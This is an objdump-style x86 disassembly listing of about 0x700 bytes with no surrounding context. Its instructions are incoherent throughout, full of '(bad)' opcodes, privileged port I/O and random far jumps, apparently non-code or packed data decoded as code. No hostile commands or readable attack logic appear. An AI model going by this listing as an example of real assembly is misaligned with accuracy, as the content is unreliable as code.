  40e94b:	sbb    DWORD PTR [eax],edx
  40e94d:	mov    ch,0xaf
  40e94f:	lods   eax,DWORD PTR ds:[esi]
  40e950:	adc    al,0x65
  40e952:	xchg   edx,eax
  40e953:	adc    edi,DWORD PTR [ebp-0x63e7ff5]
  40e959:	or     DWORD PTR [ebx-0x49b2997],0xffffffa9
  40e960:	ins    DWORD PTR es:[edi],dx
  40e961:	mov    dh,0xac
  40e963:	fsub   QWORD PTR [eax]
  40e965:	and    BYTE PTR [esp+edx*2-0x70b884aa],cl
  40e96c:	in     eax,dx
  40e96d:	icebp  
  40e96e:	leave  
  40e96f:	inc    esp
  40e970:	inc    ebp
  40e971:	js     0x40e9bc
  40e973:	mov    ds:0x4d49274a,eax
  40e978:	dec    ebp
  40e979:	popf   
  40e97a:	lea    ebx,[esi-0x16]
  40e97d:	sub    ebx,esi
  40e97f:	scas   eax,DWORD PTR es:[edi]
  40e980:	loopne 0x40e9ca
  40e982:	sub    al,0xf4
  40e984:	pop    ds
  40e985:	pop    eax
  40e986:	xchg   ebp,eax
  40e987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e988:	push   eax
  40e989:	dec    ecx
  40e98a:	jae    0x40e92c
  40e98c:	jcxz   0x40e990
  40e98f:	or     eax,0x90af60a9
  40e994:	mov    fs,WORD PTR [edx+0x16]
  40e997:	je     0x40e95b
  40e999:	dec    eax
  40e99a:	imul   esp,DWORD PTR [eax-0x19],0x6e38f236
  40e9a1:	sbb    eax,0xd38d0b96
  40e9a6:	lods   eax,DWORD PTR ds:[esi]
  40e9a7:	cdq    
  40e9a8:	xor    ebx,DWORD PTR [esi-0x6c]
  40e9ab:	jmp    0x975ed7d
  40e9b0:	mov    esp,0xf8f46ba2
  40e9b5:	enter  0x8524,0x69
  40e9b9:	je     0x40ea21
  40e9bb:	daa    
  40e9bc:	pop    edi
  40e9bd:	xor    eax,0x250ad2de
  40e9c2:	xor    al,0x4e
  40e9c4:	popa   
  40e9c5:	icebp  
  40e9c6:	je     0x40e9bb
  40e9c8:	jle    0x40e994
  40e9ca:	pop    ss
  40e9cb:	icebp  
  40e9cc:	push   esp
  40e9cd:	cli    
  40e9ce:	loop   0x40ea17
  40e9d0:	dec    esi
  40e9d1:	add    DWORD PTR [eax-0x7a],esp
  40e9d4:	mov    ch,0x9e
  40e9d6:	out    0x8,al
  40e9d8:	fidiv  WORD PTR [eax+0x4c]
  40e9db:	lahf   
  40e9dc:	pop    ebx
  40e9dd:	stos   DWORD PTR es:[edi],eax
  40e9de:	add    DWORD PTR [ebp+0x75a86a16],ebp
  40e9e4:	div    DWORD PTR [eax]
  40e9e6:	xchg   esp,eax
  40e9e7:	imul   ebp,DWORD PTR [ebp-0x71],0xf701dd1f
  40e9ee:	jecxz  0x40ea42
  40e9f0:	iret   
  40e9f1:	pop    ebx
  40e9f2:	push   edi
  40e9f3:	enter  0x84c7,0xba
  40e9f7:	cmp    BYTE PTR [ebx+0x358f43f8],bl
  40e9fd:	pop    ds
  40e9fe:	sub    ebp,DWORD PTR [edx+eiz*4+0x1a]
  40ea02:	pop    esp
  40ea03:	ja     0x40ea1c
  40ea05:	add    DWORD PTR [edx],ebx
  40ea07:	ins    DWORD PTR es:[edi],dx
  40ea08:	sub    DWORD PTR [ecx-0x5fda4b25],esp
  40ea0e:	ds out dx,al
  40ea10:	fld    st(0)
  40ea12:	test   al,0xc8
  40ea14:	div    BYTE PTR [eax+edx*4]
  40ea17:	and    DWORD PTR [ebp+0x53bf8889],ecx
  40ea1d:	xor    al,0x66
  40ea1f:	push   cs
  40ea20:	ins    DWORD PTR es:[edi],dx
  40ea21:	aam    0x14
  40ea23:	fmul   DWORD PTR [ebx]
  40ea25:	jge    0x40ea01
  40ea27:	add    esp,DWORD PTR [eax]
  40ea29:	aaa    
  40ea2a:	shl    BYTE PTR [edx-0x57],0x4c
  40ea2e:	arpl   WORD PTR [esi+0x23e83053],si
  40ea34:	sbb    BYTE PTR [ecx-0x5734536c],bh
  40ea3a:	(bad)  [edi+0xdaf0142]
  40ea40:	jbe    0x40ea6e
  40ea42:	jo     0x40ea6b
  40ea44:	jle    0x40ea6c
  40ea46:	sbb    al,0x7a
  40ea48:	outs   dx,BYTE PTR ds:[esi]
  40ea49:	jl     0x40e9de
  40ea4b:	xchg   esp,eax
  40ea4c:	bound  eax,QWORD PTR [edx]
  40ea4e:	iret   
  40ea4f:	data16 int 0x2
  40ea52:	push   cs
  40ea53:	jo     0x40ea98
  40ea55:	push   eax
  40ea56:	xlat   BYTE PTR ds:[ebx]
  40ea57:	ret    
  40ea58:	(bad)  
  40ea59:	jp     0x40ead1
  40ea5b:	not    BYTE PTR [esi+0x35bcb04f]
  40ea61:	shr    BYTE PTR [esi+0x75882028],0xa1
  40ea68:	and    ecx,edi
  40ea6a:	std    
  40ea6b:	loope  0x40ea9e
  40ea6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea6e:	push   ebp
  40ea6f:	and    al,0x10
  40ea71:	ins    DWORD PTR es:[edi],dx
  40ea72:	ss nop
  40ea74:	dec    eax
  40ea75:	dec    eax
  40ea76:	mul    BYTE PTR ds:0x178fa2af
  40ea7c:	push   0xe
  40ea7e:	push   es
  40ea7f:	sar    BYTE PTR [edi-0x21],0x38
  40ea83:	mov    ebx,0x3f876f28
  40ea88:	leave  
  40ea89:	jmp    0xc1ba:0x896162c1
  40ea90:	enter  0x4ac6,0xfb
  40ea94:	ror    al,1
  40ea96:	ds (bad) 
  40ea98:	adc    DWORD PTR [ecx-0x3b651fe8],eax
  40ea9e:	and    BYTE PTR [edx],ch
  40eaa0:	push   esp
  40eaa1:	adc    dh,bh
  40eaa3:	cmc    
  40eaa4:	xchg   BYTE PTR [ebp-0xe8cc0ff],ah
  40eaaa:	xchg   BYTE PTR [ebx+0x9],ah
  40eaad:	popf   
  40eaae:	mov    ss,ecx
  40eab0:	sub    dh,BYTE PTR [edi+0x5c]
  40eab3:	and    ebx,DWORD PTR [ecx+0x4ac4ede9]
  40eab9:	sbb    al,0x34
  40eabb:	sbb    eax,DWORD PTR [ebx-0x8]
  40eabe:	xchg   ebx,eax
  40eabf:	das    
  40eac0:	(bad)  
  40eac1:	sbb    al,0x75
  40eac3:	or     DWORD PTR [ecx+0x1c],edx
  40eac6:	popf   
  40eac7:	dec    ebx
  40eac8:	in     al,0xe0
  40eaca:	mov    bl,0xe2
  40eacc:	es push 0xffffffe4
  40eacf:	xor    esp,DWORD PTR [edi-0x1a]
  40ead2:	sti    
  40ead3:	hlt    
  40ead4:	into   
  40ead5:	sub    dl,0xfc
  40ead8:	fisub  WORD PTR [ebx-0x66]
  40eadb:	cmp    edx,ebx
  40eadd:	sub    dl,bl
  40eadf:	loope  0x40eaf2
  40eae1:	test   al,0x84
  40eae3:	pop    ebx
  40eae4:	into   
  40eae5:	adc    DWORD PTR [edx],esp
  40eae7:	popf   
  40eae8:	lods   al,BYTE PTR ds:[esi]
  40eae9:	ins    BYTE PTR es:[edi],dx
  40eaea:	adc    al,0xea
  40eaec:	and    cl,BYTE PTR [ebp-0x74]
  40eaef:	jge    0x40eab9
  40eaf1:	pop    ss
  40eaf2:	cmp    esi,DWORD PTR [ebx-0x4ed1dbb1]
  40eaf8:	add    al,0x34
  40eafa:	and    DWORD PTR [esi],edx
  40eafc:	dec    eax
  40eafd:	je     0x40eab5
  40eaff:	xchg   esi,eax
  40eb00:	add    eax,0xce7b7458
  40eb05:	add    ecx,edi
  40eb07:	push   edx
  40eb08:	repnz arpl di,bp
  40eb0b:	lods   eax,DWORD PTR ds:[esi]
  40eb0c:	repz pop ebx
  40eb0e:	inc    DWORD PTR [ecx+0x44da0ace]
  40eb14:	aad    0xf2
  40eb16:	sar    BYTE PTR [esi+0x73],cl
  40eb19:	pop    ebp
  40eb1a:	sbb    esi,edi
  40eb1c:	push   esi
  40eb1d:	mov    esp,0xc1a35480
  40eb22:	or     edx,DWORD PTR [ebp-0x44ccd25d]
  40eb28:	iret   
  40eb29:	xchg   ebx,eax
  40eb2a:	mov    ds:0xd33f22de,al
  40eb2f:	push   es
  40eb30:	aas    
  40eb31:	add    DWORD PTR [edx-0x7d641e59],0xffffffe6
  40eb38:	clc    
  40eb39:	frstor [si]
  40eb3c:	xor    BYTE PTR [eax],dl
  40eb3e:	cmp    BYTE PTR [ebx*2+0x4231a92a],0xd7
  40eb46:	sub    edx,eax
  40eb48:	je     0x40ebaf
  40eb4a:	pushf  
  40eb4b:	xor    DWORD PTR [eax-0x1ad3b8f],ebx
  40eb51:	add    bl,0xc2
  40eb54:	arpl   WORD PTR [edi],di
  40eb56:	push   0xffffffbd
  40eb58:	das    
  40eb59:	xor    al,0xf2
  40eb5b:	popa   
  40eb5c:	out    dx,al
  40eb5d:	or     esi,esi
  40eb5f:	and    ah,cl
  40eb61:	adc    al,0xba
  40eb63:	loopne 0x40ebae
  40eb65:	and    al,0xb4
  40eb67:	cmp    DWORD PTR [ebx+0x42afdb13],ecx
  40eb6d:	loop   0x40ebe4
  40eb6f:	mov    edi,esi
  40eb71:	popf   
  40eb72:	xchg   esp,eax
  40eb73:	xor    ebx,DWORD PTR [edx]
  40eb75:	add    ebx,eax
  40eb77:	xchg   BYTE PTR [ecx],bl
  40eb79:	ds mov ch,0x8a
  40eb7c:	jmp    DWORD PTR [ebp+0x2a3345de]
  40eb82:	push   0xf0d50335
  40eb87:	and    BYTE PTR [ebp+eiz*2+0xe8568cc],dl
  40eb8e:	lods   al,BYTE PTR ds:[esi]
  40eb8f:	(bad)  
  40eb90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb91:	outs   dx,BYTE PTR ds:[esi]
  40eb92:	iret   
  40eb93:	rcl    DWORD PTR [eax+0x55],1
  40eb96:	sahf   
  40eb97:	push   edi
  40eb98:	mov    eax,ds:0x5782d02f
  40eb9d:	jns    0x40eb6b
  40eb9f:	daa    
  40eba0:	sub    esp,ebx
  40eba2:	into   
  40eba3:	inc    ebp
  40eba4:	jge    0x40ec0c
  40eba6:	mov    bl,0x84
  40eba8:	or     eax,0x8a048908
  40ebad:	pusha  
  40ebae:	and    edi,DWORD PTR [edi+0x5]
  40ebb1:	dec    ecx
  40ebb2:	ret    0xcd52
  40ebb5:	or     DWORD PTR [ebp-0x39f6ca69],edx
  40ebbb:	jge    0x40eb5d
  40ebbd:	mov    edi,ss
  40ebbf:	shr    DWORD PTR [ebp-0x13c31d27],1
  40ebc5:	cmp    bh,BYTE PTR [eax+0x7d2067ff]
  40ebcb:	es ds xchg ebx,eax
  40ebce:	pop    esp
  40ebcf:	add    al,0x7
  40ebd1:	std    
  40ebd2:	pop    eax
  40ebd3:	bound  ecx,QWORD PTR [ebx]
  40ebd5:	sub    BYTE PTR [esi],ah
  40ebd7:	xor    al,0x9a
  40ebd9:	and    eax,0x3696dcf7
  40ebde:	sub    eax,0xc5433ff2
  40ebe3:	out    dx,al
  40ebe4:	adc    esp,DWORD PTR [ecx+ecx*2]
  40ebe7:	sub    edx,eax
  40ebe9:	pop    ds
  40ebea:	inc    edx
  40ebeb:	mov    ah,0x44
  40ebed:	push   ebp
  40ebee:	sbb    dh,ch
  40ebf0:	pop    ebp
  40ebf1:	xor    eax,0x839b9225
  40ebf6:	push   es
  40ebf7:	imul   edx,edx,0xffffffd1
  40ebfa:	repz mov ah,BYTE PTR [eax]
  40ebfd:	cmp    edi,ebp
  40ebff:	cld    
  40ec00:	xchg   edx,eax
  40ec01:	and    eax,0xaaf7c834
  40ec06:	sub    BYTE PTR [edx-0x49],dl
  40ec09:	into   
  40ec0a:	inc    ebx
  40ec0b:	pop    es
  40ec0c:	imul   edx,esi,0xfffffff9
  40ec0f:	lahf   
  40ec10:	lea    eax,[edi]
  40ec12:	mov    al,0xa0
  40ec14:	repz mov edx,DWORD PTR [eax-0x30]
  40ec18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec19:	popf   
  40ec1a:	sbb    ebx,esi
  40ec1c:	rol    BYTE PTR [edx],0x80
  40ec1f:	dec    edx
  40ec20:	and    eax,0x1c961200
  40ec25:	push   ss
  40ec26:	scas   al,BYTE PTR es:[edi]
  40ec27:	(bad)  
  40ec28:	(bad)  [edx]
  40ec2a:	retf   
  40ec2b:	mov    edi,0x527d659
  40ec30:	xchg   ebx,eax
  40ec31:	adc    al,0x7a
  40ec33:	imul   edx,DWORD PTR [eax+0x74],0x47
  40ec37:	call   0x85a9c3c2
  40ec3c:	or     BYTE PTR [ebx+0x45],ch
  40ec3f:	test   DWORD PTR [ebx],0xc067cce5
  40ec45:	mov    ch,0xfe
  40ec47:	cdq    
  40ec48:	sar    BYTE PTR [ebx],1
  40ec4a:	cs jge 0x40ebfc
  40ec4d:	mov    eax,ds:0x48a01a1b
  40ec52:	mov    ah,0x3a
  40ec54:	das    
  40ec55:	push   ds
  40ec56:	stos   BYTE PTR es:[edi],al
  40ec57:	push   DWORD PTR [ebx-0x3a87e7df]
  40ec5d:	les    ebx,FWORD PTR [eax+ebx*4-0x5c]
  40ec61:	fwait
  40ec62:	aad    0xb
  40ec64:	pushf  
  40ec65:	jnp    0x40ec3d
  40ec67:	and    al,0x4b
  40ec69:	scas   eax,DWORD PTR es:[edi]
  40ec6a:	or     BYTE PTR [edx-0x24],0xfd
  40ec6e:	imul   ebp,DWORD PTR [edx],0xc156045c
  40ec74:	cld    
  40ec75:	mov    ds:0x5b628488,al
  40ec7a:	sbb    cl,BYTE PTR [ecx-0x50]
  40ec7d:	inc    eax
  40ec7e:	mov    ds:0xe07456a4,al
  40ec83:	js     0x40ecd2
  40ec85:	stos   BYTE PTR es:[edi],al
  40ec86:	lods   eax,DWORD PTR ds:[esi]
  40ec87:	jns    0x40ec33
  40ec89:	ins    BYTE PTR es:[edi],dx
  40ec8a:	lods   al,BYTE PTR ds:[esi]
  40ec8b:	cli    
  40ec8c:	sti    
  40ec8d:	sbb    edx,edi
  40ec8f:	popa   
  40ec90:	push   ebp
  40ec91:	cdq    
  40ec92:	mov    cl,dh
  40ec94:	or     DWORD PTR [eax],0xeb6d5cba
  40ec9a:	fidivr DWORD PTR [eax-0x2]
  40ec9d:	aad    0x36
  40ec9f:	scas   al,BYTE PTR es:[edi]
  40eca0:	sbb    esi,DWORD PTR ds:0x3173bc7a
  40eca6:	cmp    al,0xc5
  40eca8:	mov    WORD PTR ds:0x5ae1da29,es
  40ecae:	mov    BYTE PTR [eax-0x5a],ah
  40ecb1:	je     0x40ec6e
  40ecb3:	addr16 jb 0x40ec4c
  40ecb6:	(bad)  
  40ecb7:	in     al,0xd
  40ecb9:	in     al,dx
  40ecba:	add    BYTE PTR [eax-0x73],0x58
  40ecbe:	adc    BYTE PTR [ebp+0x7e0088d],ch
  40ecc4:	and    edx,edi
  40ecc6:	repz popa 
  40ecc8:	sbb    DWORD PTR [ecx],0x3973e6d8
  40ecce:	mov    DWORD PTR [esi-0x16],esp
  40ecd1:	xor    BYTE PTR [esi],dh
  40ecd3:	jb     0x40ecec
  40ecd5:	xor    ch,al
  40ecd7:	shl    esp,cl
  40ecd9:	in     eax,0x55
  40ecdb:	mov    eax,ds:0xddaa0812
  40ece0:	jp     0x40ecc5
  40ece2:	xchg   edi,eax
  40ece3:	clc    
  40ece4:	aam    0x1f
  40ece6:	and    bl,bl
  40ece8:	pop    ds
  40ece9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecea:	lahf   
  40eceb:	push   ss
  40ecec:	and    ecx,DWORD PTR [ecx+edx*8+0xf]
  40ecf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf1:	jbe    0x40ed37
  40ecf3:	add    BYTE PTR [eax],0xd2
  40ecf6:	pop    ebx
  40ecf7:	test   dl,dh
  40ecf9:	mov    ds:0xb0427a79,al
  40ecfe:	pop    esp
  40ecff:	sub    DWORD PTR [ebx],esi
  40ed01:	push   0x34c80f0b
  40ed06:	pop    eax
  40ed07:	push   edx
  40ed08:	mov    al,ds:0x995c0837
  40ed0d:	jg     0x40ed29
  40ed0f:	pop    ebx
  40ed10:	cmp    dl,BYTE PTR [ebx]
  40ed12:	and    DWORD PTR [edx+0x6b4b3d0c],ebx
  40ed18:	and    al,0x18
  40ed1a:	sbb    al,0x3a
  40ed1c:	mov    esi,DWORD PTR [ecx+0x70]
  40ed1f:	sbb    cl,BYTE PTR [edx+edi*2-0x6f]
  40ed23:	je     0x40ed63
  40ed25:	or     eax,0xdc61b0be
  40ed2a:	jne    0x40ed00
  40ed2c:	jle    0x40ecc1
  40ed2e:	mov    ecx,0xa7ac95dc
  40ed33:	xchg   esp,eax
  40ed34:	ins    DWORD PTR es:[edi],dx
  40ed35:	leave  
  40ed36:	xlat   BYTE PTR ds:[ebx]
  40ed37:	adc    BYTE PTR [ebx+ebx*2],ch
  40ed3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed3b:	adc    DWORD PTR [esi-0x2cb7796a],ebx
  40ed41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed42:	jbe    0x40ed5c
  40ed44:	pop    ss
  40ed45:	and    ah,bl
  40ed47:	push   ds
  40ed48:	fisubr WORD PTR [ebp-0x7857ddd0]
  40ed4e:	add    DWORD PTR [edx],edi
  40ed50:	mov    ds:0x8ae726,eax
  40ed55:	(bad)  
  40ed56:	jp     0x40ed15
  40ed58:	in     eax,0xb7
  40ed5a:	xchg   DWORD PTR [esi-0x3a],edx
  40ed5d:	mov    ah,0x4
  40ed5f:	mov    eax,ds:0x6b008814
  40ed64:	pop    esi
  40ed65:	inc    esp
  40ed66:	jnp    0x40ed89
  40ed68:	mov    dh,0xfe
  40ed6a:	pusha  
  40ed6b:	stc    
  40ed6c:	xor    BYTE PTR [esi-0x75],cl
  40ed6f:	outs   dx,BYTE PTR ds:[esi]
  40ed70:	xchg   ecx,eax
  40ed71:	stos   BYTE PTR es:[edi],al
  40ed72:	push   ds
  40ed73:	push   ds
  40ed74:	sub    BYTE PTR [ebp-0x532de484],0xcc
  40ed7b:	mov    bl,BYTE PTR [esi-0x290519a]
  40ed81:	aas    
  40ed82:	mov    ds:0x591e6ebe,al
  40ed87:	test   al,0x1c
  40ed89:	push   edx
  40ed8a:	and    al,0x7e
  40ed8c:	retf   
  40ed8d:	sub    BYTE PTR [esi+0x58],cl
  40ed90:	repnz out 0x0,al
  40ed93:	mov    edi,0x4bb0fced
  40ed98:	pop    ds
  40ed99:	sub    eax,0xedd3e1f7
  40ed9e:	rol    DWORD PTR [esi-0x47],cl
  40eda1:	or     al,0xe1
  40eda3:	inc    esi
  40eda4:	mov    edx,0x66f63623
  40eda9:	mov    edi,0x3c4bb3d5
  40edae:	push   es
  40edaf:	shl    BYTE PTR [ebp+0x3c],1
  40edb2:	or     eax,0x9390e228
  40edb7:	dec    ebx
  40edb8:	mov    bl,0xfb
  40edba:	dec    esp
  40edbb:	add    eax,0xc0fad0bd
  40edc0:	add    DWORD PTR [edx-0x22],esp
  40edc3:	das    
  40edc4:	push   ebp
  40edc5:	pop    ebx
  40edc6:	xchg   ecx,eax
  40edc7:	das    
  40edc8:	scas   eax,DWORD PTR es:[edi]
  40edc9:	xchg   esi,eax
  40edca:	lods   eax,DWORD PTR ds:[esi]
  40edcb:	ss pop esi
  40edcd:	jl     0x40ee04
  40edcf:	xor    al,0x78
  40edd1:	das    
  40edd2:	xlat   BYTE PTR ds:[ebx]
  40edd3:	xlat   BYTE PTR ds:[ebx]
  40edd4:	int3   
  40edd5:	jl     0x40ee52
  40edd7:	in     al,dx
  40edd8:	or     al,0x8a
  40edda:	sahf   
  40eddb:	int3   
  40eddc:	sub    eax,0xb7f12012
  40ede1:	jl     0x40ed63
  40ede3:	push   0x8ddf6b72
  40ede8:	xchg   esp,eax
  40ede9:	mov    eax,0xdfcb6667
  40edee:	mov    ebp,0x923952cd
  40edf3:	lea    edi,[esi]
  40edf5:	push   cs
  40edf6:	adc    al,BYTE PTR [esi]
  40edf8:	sub    BYTE PTR [edi+0x3f],ah
  40edfb:	out    dx,eax
  40edfc:	jge    0x40edf5
  40edfe:	mov    al,0x57
  40ee00:	addr16 fsubr st(5),st
  40ee03:	lods   al,BYTE PTR ds:[esi]
  40ee04:	popa   
  40ee05:	enter  0x2a4b,0x7f
  40ee09:	cld    
  40ee0a:	test   BYTE PTR ds:0x569abc5b,dl
  40ee10:	xchg   ebx,eax
  40ee11:	dec    esi
  40ee12:	outs   dx,DWORD PTR ds:[esi]
  40ee13:	fadd   DWORD PTR [esi+0x259d6e4c]
  40ee19:	pop    ecx
  40ee1a:	ins    DWORD PTR es:[edi],dx
  40ee1b:	push   0xffffff86
  40ee1d:	adc    al,0x97
  40ee1f:	inc    edx
  40ee20:	sbb    bl,dl
  40ee22:	pop    esi
  40ee23:	or     DWORD PTR [ebp-0x4a],ebp
  40ee26:	add    BYTE PTR [ebx+ecx*1],dh
  40ee29:	mov    dl,0xf2
  40ee2b:	pushf  
  40ee2c:	test   ecx,esp
  40ee2e:	dec    ebp
  40ee2f:	push   eax
  40ee30:	js     0x40ee30
  40ee32:	xor    BYTE PTR [ecx+0x79],ch
  40ee35:	aad    0xa9
  40ee37:	in     eax,0xb8
  40ee39:	sbb    cl,dl
  40ee3b:	jmp    0xf7320dfd
  40ee40:	pop    ebx
  40ee41:	adc    eax,0x9da5e5c3
  40ee46:	ds call 0x467a:0xefdc9e08
  40ee4e:	xchg   edi,eax
  40ee4f:	jnp    0x40ee83
  40ee51:	lods   al,BYTE PTR ds:[esi]
  40ee52:	enter  0xb1ca,0xb3
  40ee56:	gs jge 0x40ee4f
  40ee59:	mov    esp,0x7d36181b
  40ee5e:	repnz cli 
  40ee60:	xchg   ecx,eax
  40ee61:	cmp    cl,BYTE PTR [ecx-0x12dc05a7]
  40ee67:	mov    ds:0x58f46c51,al
  40ee6c:	xchg   edi,eax
  40ee6d:	dec    ebp
  40ee6e:	xor    DWORD PTR [edi-0x44],esi
  40ee71:	mov    ?,WORD PTR [edx-0x3f]
  40ee74:	sbb    DWORD PTR [ecx+0x54],ecx
  40ee77:	pop    ds
  40ee78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee79:	fist   WORD PTR [ecx+0x2a5ebd34]
  40ee7f:	add    ecx,DWORD PTR [ecx+0x5d]
  40ee82:	jno    0x40ee0a
  40ee84:	or     bh,cl
  40ee86:	jns    0x40ee3d
  40ee88:	rcr    ecx,0x2f
  40ee8b:	add    eax,0xde7e09a4
  40ee90:	fwait
  40ee91:	xor    eax,0xa87d5733
  40ee96:	push   esp
  40ee97:	sbb    al,0xbd
  40ee99:	(bad)  
  40ee9a:	and    eax,0x3b9b9cb9
  40ee9f:	pop    esp
  40eea0:	dec    ebx
  40eea1:	test   eax,0xfc2f1cc7
  40eea6:	shl    BYTE PTR [esp+esi*4-0x3e],0xd8
  40eeab:	rcl    DWORD PTR [ecx],1
  40eead:	cmc    
  40eeae:	pop    ds
  40eeaf:	clc    
  40eeb0:	push   eax
  40eeb1:	sbb    al,0x30
  40eeb3:	ror    DWORD PTR [edx],1
  40eeb5:	stc    
  40eeb6:	cmp    edi,DWORD PTR ds:0xeb65623
  40eebc:	pop    ebp
  40eebd:	loope  0x40ee4a
  40eebf:	mov    eax,ds:0x60b5adde
  40eec4:	jecxz  0x40ee68
  40eec6:	aad    0x66
  40eec8:	scas   al,BYTE PTR es:[edi]
  40eec9:	outs   dx,DWORD PTR ds:[esi]
  40eeca:	add    bl,BYTE PTR [ebx]
  40eecc:	pushf  
  40eecd:	jmp    0x121d:0x41ad2f21
  40eed4:	add    edx,DWORD PTR [eax-0x3f7da8c9]
  40eeda:	je     0x40eea6
  40eedc:	bound  esi,QWORD PTR [edi]
  40eede:	adc    al,0x45
  40eee0:	push   eax
  40eee1:	sub    esp,DWORD PTR [esi-0x20579f85]
  40eee7:	fidivr DWORD PTR [esi+ecx*4]
  40eeea:	push   esi
  40eeeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeec:	es cdq 
  40eeee:	aaa    
  40eeef:	data16 and dh,BYTE PTR [esp+esi*1+0x72dc1f02]
  40eef7:	ds or  al,0xcd
  40eefa:	jge    0x40ee81
  40eefc:	lods   al,BYTE PTR ds:[esi]
  40eefd:	or     cl,BYTE PTR [eax+ecx*4+0x56]
  40ef01:	stc    
  40ef02:	es ss mov eax,ss
  40ef06:	enter  0xc3a6,0xab
  40ef0a:	add    edx,ecx
  40ef0c:	cmc    
  40ef0d:	add    eax,0x1ed6f625
  40ef12:	aas    
  40ef13:	in     eax,0xad
  40ef15:	mov    esp,0x6b91b414
  40ef1a:	mov    eax,ds:0x75974889
  40ef1f:	imul   ecx,ecx,0x1e40d0c7
  40ef25:	xchg   ecx,eax
  40ef26:	pmulhuw mm4,QWORD PTR [edx+0x26]
  40ef2a:	mov    dl,0x7c
  40ef2c:	add    eax,0x8b52a64a
  40ef31:	mov    ds:0x887f632,eax
  40ef36:	xchg   DWORD PTR [ebx+eax*4+0x32],esi
  40ef3a:	cmp    ah,BYTE PTR [eax+0x54]
  40ef3d:	push   ds
  40ef3e:	push   ecx
  40ef3f:	push   cs
  40ef40:	div    DWORD PTR [ecx-0x49b3db23]
  40ef46:	xor    al,0x45
  40ef48:	ret    
  40ef49:	push   ebx
  40ef4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef4b:	mov    ebx,gs
  40ef4d:	cld    
  40ef4e:	mov    WORD PTR [eax+0x4],gs
  40ef51:	pop    esp
  40ef52:	test   al,0x52
  40ef54:	or     al,0x0
  40ef56:	and    eax,0x16ea03c9
  40ef5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5c:	out    0xf7,al
  40ef5e:	inc    eax
  40ef5f:	popa   
  40ef60:	and    eax,0xdf688591
  40ef65:	xchg   ebp,eax
  40ef66:	neg    dl
  40ef68:	fmul   QWORD PTR [esi]
  40ef6a:	shl    DWORD PTR [edx-0x1],1
  40ef6d:	mov    cl,0x5e
  40ef6f:	mov    edi,0xc66d1213
  40ef74:	adc    al,bh
  40ef76:	xor    BYTE PTR [edi],0x4a
  40ef79:	push   ebx
  40ef7a:	xchg   BYTE PTR [ebx],dl
  40ef7c:	clc    
  40ef7d:	test   ecx,ebp
  40ef7f:	pushf  
  40ef80:	sub    eax,0xb26b56b
  40ef85:	lods   eax,DWORD PTR ds:[esi]
  40ef86:	mov    bh,0xa2
  40ef88:	push   ds
  40ef89:	inc    esp
  40ef8a:	cmp    eax,0xc2de5a82
  40ef8f:	fild   DWORD PTR [edx-0x68390797]
  40ef95:	mov    BYTE PTR [ecx+0x3b],dh
  40ef98:	mov    esp,0x2d2e387e
  40ef9d:	dec    ebp
  40ef9e:	and    dh,dh
  40efa0:	pop    ebp
  40efa1:	inc    edi
  40efa2:	mov    eax,ds:0xfe213805
  40efa7:	pop    esp
  40efa8:	sub    BYTE PTR [ecx+esi*4+0x71],ch
  40efac:	int    0x13
  40efae:	sub    BYTE PTR [ecx+0x1ba470f1],ah
  40efb4:	push   cs
  40efb5:	scas   al,BYTE PTR es:[edi]
  40efb6:	call   0xb51032bb
  40efbb:	repnz fild WORD PTR [esi-0x374239cf]
  40efc2:	inc    esp
  40efc3:	fld    QWORD PTR [ecx-0x6d]
  40efc6:	repz sub DWORD PTR [esi],ebp
  40efc9:	mov    cl,0x99
  40efcb:	and    esi,DWORD PTR [edx-0x26]
  40efce:	es push ecx
  40efd0:	xchg   DWORD PTR [edx+0x367fdf03],esp
  40efd6:	inc    ecx
  40efd7:	cmp    ch,dl
  40efd9:	xor    al,0x80
  40efdb:	dec    edx
  40efdc:	sub    ebp,DWORD PTR [esi+esi*8]
  40efdf:	jecxz  0x40efe3
  40efe1:	mov    WORD PTR [ebx-0x522736d],cs
  40efe7:	repnz mov edx,0x580c7207
  40efed:	test   DWORD PTR [ebx+edi*2+0x73],eax
  40eff1:	cmp    DWORD PTR [edi-0x6b5d1bea],ebp
  40eff7:	push   edx
  40eff8:	stos   DWORD PTR es:[edi],eax
  40eff9:	mov    ah,0xf3
  40effb:	ret    0xc138
  40effe:	pop    ebx
  40efff:	mov    bl,0x68
  40f001:	mov    WORD PTR [esi-0x4a004cde],gs
  40f007:	gs enter 0xd144,0xfd
  40f00c:	int    0x46
  40f00e:	test   al,0x97
  40f011:	mov    ch,0x8c
  40f013:	mov    al,ds:0xf19e791d
  40f018:	jmp    0x7d593985
  40f01d:	retf   
  40f01e:	or     ah,ch
  40f020:	adc    DWORD PTR [eax-0x4e],ebp
  40f023:	rol    ebp,cl
  40f025:	push   es
  40f026:	sbb    DWORD PTR [esi],esi
  40f028:	pop    ebx
  40f029:	cwde   
  40f02a:	test   al,0xb2
  40f02c:	mov    al,ds:0x1414cba7
  40f031:	aaa    
  40f032:	(bad)  
  40f033:	cmc    
  40f034:	pop    ecx
  40f035:	sbb    al,0x7e
  40f037:	ficom  WORD PTR ds:0x6bdc2f64
  40f03d:	scas   eax,DWORD PTR es:[edi]
  40f03e:	and    al,BYTE PTR [esi-0xb]
  40f041:	pop    ss
  40f042:	shr    DWORD PTR [esp+esi*4-0x67],1
  40f046:	popa   
  40f047:	inc    edx
  40f048:	les    edx,FWORD PTR [edx+0x10c2a8a8]
  40f04e:	sbb    eax,0x43af9a82
  40f053:	mov    ds:0x1c29eb1d,eax
  40f058:	cmp    al,0x49
  40f05a:	lock test DWORD PTR [eax-0x52],edi
  40f05e:	mov    eax,ds:0xa79c0d29
  40f063:	gs pop edx
  40f065:	ret    
  40f066:	cld    
  40f067:	push   0x32
  40f069:	out    0xc5,al
  40f06b:	loope  0x40f0bb
  40f06d:	inc    ebx
